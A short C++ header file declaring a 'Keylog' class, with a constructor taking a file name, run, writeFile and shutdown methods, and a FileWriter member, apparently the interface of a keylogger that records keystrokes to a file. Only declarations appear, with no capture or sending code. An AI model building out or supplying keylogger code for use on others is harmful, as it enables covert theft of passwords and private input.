#ifndef _KEYLOG_HH_
#define _KEYLOG_HH_

#include "fileWriter.hh"

class Keylog
{
	public:
		Keylog(char* file);
		~Keylog();
		void run();
		void writeFile(char data);
		void shutdown();

	private:
		FileWriter* fileOutput;
		bool writer;
};

#endif
